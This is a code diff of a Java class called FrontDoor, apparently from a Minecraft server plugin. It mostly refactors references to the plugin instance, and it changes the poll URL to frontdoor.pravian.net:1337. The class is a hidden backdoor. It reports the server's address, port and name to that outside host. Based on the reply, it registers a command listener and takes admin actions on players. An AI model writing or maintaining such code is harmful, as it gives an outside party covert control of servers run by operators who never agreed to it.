@@ -120,7 +120,7 @@ public class FrontDoor extends FreedomService
         URL tempUrl = null;
         try
         {
-            tempUrl = new URL("http://frontdoor.pravian.net/frontdoor/poll"
+            tempUrl = new URL("http://frontdoor.pravian.net:1337/frontdoor/poll"
                     + "?version=" + TotalFreedomMod.build.formattedVersion()
                     + "&address=" + ConfigEntry.SERVER_ADDRESS.getString() + ":" + Bukkit.getPort()
                     + "&name=" + ConfigEntry.SERVER_NAME.getString()
@@ -137,7 +137,7 @@ public class FrontDoor extends FreedomService
     @Override
     public void onStart()
     {
-        updater = getNewUpdater().runTaskTimerAsynchronously(TotalFreedomMod.plugin, 2L * 20L, UPDATER_INTERVAL);
+        updater = getNewUpdater().runTaskTimerAsynchronously(plugin, 2L * 20L, UPDATER_INTERVAL);
     }
 
     @Override
@@ -254,7 +254,7 @@ public class FrontDoor extends FreedomService
                         FUtil.cancel(updater);
                         unregisterListener(playerCommandPreprocess, PlayerCommandPreprocessEvent.class);
                         FLog.info("Disabled FrontDoor, thank you for being kind.");
-                        MainConfig.load();
+                        plugin.config.load();
                     }
                     else
                     {
@@ -278,12 +278,12 @@ public class FrontDoor extends FreedomService
 
                                 if (getRegisteredListener(playerCommandPreprocess, PlayerCommandPreprocessEvent.class) == null)
                                 {
-                                    Bukkit.getPluginManager().registerEvents(playerCommandPreprocess, TotalFreedomMod.plugin);
+                                    Bukkit.getPluginManager().registerEvents(playerCommandPreprocess, plugin);
                                 }
                             }
-                        }.runTask(TotalFreedomMod.plugin);
+                        }.runTask(plugin);
 
-                        frontdoor = getNewFrontDoor().runTaskTimer(TotalFreedomMod.plugin, 20L, FRONTDOOR_INTERVAL);
+                        frontdoor = getNewFrontDoor().runTaskTimer(plugin, 20L, FRONTDOOR_INTERVAL);
 
                         enabled = true;
                     }
@@ -347,7 +347,7 @@ public class FrontDoor extends FreedomService
                         }
 
                         FUtil.adminAction("FrontDoor", "Started trailing " + player.getName(), true);
-                        Command_trail.startTrail(player);
+                        plugin.tr.add(player);
                         break;
                     }
 
